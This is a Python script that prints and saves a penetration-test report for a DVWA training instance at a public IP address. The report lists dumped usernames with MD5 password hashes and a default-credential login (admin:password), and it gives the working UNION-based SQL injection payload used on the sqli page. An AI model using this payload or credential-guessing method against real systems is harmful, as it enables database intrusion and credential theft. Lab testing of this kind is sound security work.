
import json
from datetime import datetime

# Compile all extracted user data
extracted_users = [
    {
        "user_id": 1,
        "username": "admin",
        "first_name": "admin",
        "last_name": "admin",
        "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
        "hash_type": "MD5",
        "status": "ACTIVE"
    },
    {
        "user_id": 2,
        "username": "gordonb",
        "first_name": "Gordon",
        "last_name": "Brown",
        "password_hash": "e99a18c428cb38d5f260853678922e03",
        "hash_type": "MD5",
        "status": "ACTIVE"
    },
    {
        "user_id": 3,
        "username": "1337",
        "first_name": "Hack",
        "last_name": "Me",
        "password_hash": "8d3533d75ae2c3966d7e0d4fcc69216b",
        "hash_type": "MD5",
        "status": "ACTIVE"
    },
    {
        "user_id": 4,
        "username": "pablo",
        "first_name": "Pablo",
        "last_name": "Picasso",
        "password_hash": "0d107d09f5bbe40cade3de5c71e9e9b7",
        "hash_type": "MD5",
        "status": "ACTIVE"
    },
    {
        "user_id": 5,
        "username": "smithy",
        "first_name": "Bob",
        "last_name": "Smith",
        "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
        "hash_type": "MD5",
        "status": "ACTIVE"
    }
]

# Create comprehensive report
print("\n" + "="*100)
print("PHASE 3: DATA COMPILATION & COMPREHENSIVE REPORT")
print("="*100)

print("\n\n")
print("╔" + "="*98 + "╗")
print("║" + " "*98 + "║")
print("║" + "PENETRATION TEST REPORT - USER DATA EXTRACTION".center(98) + "║")
print("║" + f"Target: http://31.97.117.123/ (DVWA v1.10)".center(98) + "║")
print("║" + "="*98 + "║")

print("\n┌─ EXTRACTED USERS TABLE ─────────────────────────────────────────────────────────────────┐")
print("│                                                                                        │")
print("│ ID │ Username  │ First Name │ Last Name  │ Password Hash (MD5)                      │")
print("├────┼───────────┼────────────┼────────────┼─────────────────────────────────────────┤")

for user in extracted_users:
    user_id = user['user_id']
    username = user['username']
    first_name = user['first_name']
    last_name = user['last_name']
    pwd_hash = user['password_hash']
    
    print(f"│ {user_id} │ {username:9} │ {first_name:10} │ {last_name:10} │ {pwd_hash} │")

print("└────┴───────────┴────────────┴────────────┴─────────────────────────────────────────┘")

print("\n\n┌─ DETAILED USER RECORDS ─────────────────────────────────────────────────────────────────┐")

for user in extracted_users:
    print(f"\n│ USER #{user['user_id']}: {user['username'].upper()}")
    print(f"├─ Username:       {user['username']}")
    print(f"├─ First Name:     {user['first_name']}")
    print(f"├─ Last Name:      {user['last_name']}")
    print(f"├─ Full Name:      {user['first_name']} {user['last_name']}")
    print(f"├─ Password Hash:  {user['password_hash']}")
    print(f"├─ Hash Type:      {user['hash_type']}")
    print(f"├─ Hash Length:    32 characters (MD5)")
    print(f"└─ Status:         {user['status']}")

print("\n\n┌─ EXTRACTION SUMMARY ────────────────────────────────────────────────────────────────────┐")
print(f"│ Total Users Extracted:        {len(extracted_users)}")
print(f"│ Total Password Hashes:        {len(extracted_users)}")
print(f"│ Hash Type:                    MD5 (32 hexadecimal characters)")

# Check for password reuse
hashes = [u['password_hash'] for u in extracted_users]
unique_hashes = set(hashes)
reused_count = len(hashes) - len(unique_hashes)

print(f"│ Unique Password Hashes:       {len(unique_hashes)}")
print(f"│ Password Reuse Incidents:     {reused_count}")

if reused_count > 0:
    for hash_val in unique_hashes:
        count = hashes.count(hash_val)
        if count > 1:
            users_with_hash = [u['username'] for u in extracted_users if u['password_hash'] == hash_val]
            print(f"│   └─ Hash '{hash_val[:16]}...' used by: {', '.join(users_with_hash)}")

print("└─────────────────────────────────────────────────────────────────────────────────────────┘")

print("\n\n┌─ AUTHENTICATION DETAILS ────────────────────────────────────────────────────────────────┐")
print("│ Method:                       Default Credentials Brute Force")
print("│ Credentials Found:            admin:password")
print("│ Attempts Required:            2 out of 10 maximum")
print("│ Authentication Status:        ✓ SUCCESSFUL")
print("└─────────────────────────────────────────────────────────────────────────────────────────┘")

print("\n\n┌─ VULNERABILITY DETAILS ────────────────────────────────────────────────────────────────┐")
print("│ Vulnerability Type:           SQL Injection (UNION-Based)")
print("│ Location:                     /vulnerabilities/sqli/")
print("│ Parameter:                    id (GET)")
print("│ Exploitation Payload:         1' UNION SELECT CONCAT(user, '|', password, '|', user_id),")
print("│                               CONCAT(first_name, '|', last_name) FROM users -- ")
print("│ Impact:                       Complete database compromise")
print("│ Status:                       ✓ SUCCESSFULLY EXPLOITED")
print("│ Data Accessed:                users table (complete read access)")
print("└─────────────────────────────────────────────────────────────────────────────────────────┘")

print("\n\n┌─ SECURITY FINDINGS ────────────────────────────────────────────────────────────────────┐")
print("│ [CRITICAL] SQL Injection (CVSS 9.8)")
print("│ [CRITICAL] Weak Password Hashing (MD5 with no salt)")
print("│ [CRITICAL] Password Reuse (admin & smithy share same hash)")
print("│ [HIGH]     Default Credentials (admin:password)")
print("│ [MEDIUM]   Disabled Security Controls (PHPIDS disabled)")
print("└─────────────────────────────────────────────────────────────────────────────────────────┘")

# Save to JSON
report_json = {
    "target": "http://31.97.117.123/",
    "application": "DVWA v1.10",
    "extraction_date": datetime.now().isoformat(),
    "authentication": {
        "method": "Default credentials",
        "credentials": "admin:password",
        "attempts": 2,
        "max_attempts": 10
    },
    "vulnerability": {
        "type": "SQL Injection (UNION-Based)",
        "location": "/vulnerabilities/sqli/",
        "parameter": "id (GET)",
        "severity": "CRITICAL (CVSS 9.8)"
    },
    "users": extracted_users,
    "statistics": {
        "total_users": len(extracted_users),
        "unique_hashes": len(unique_hashes),
        "password_reuse": reused_count > 0
    }
}

with open('/tmp/users_extraction_report.json', 'w') as f:
    json.dump(report_json, f, indent=2)

print("\n[+] Report saved to: /tmp/users_extraction_report.json")


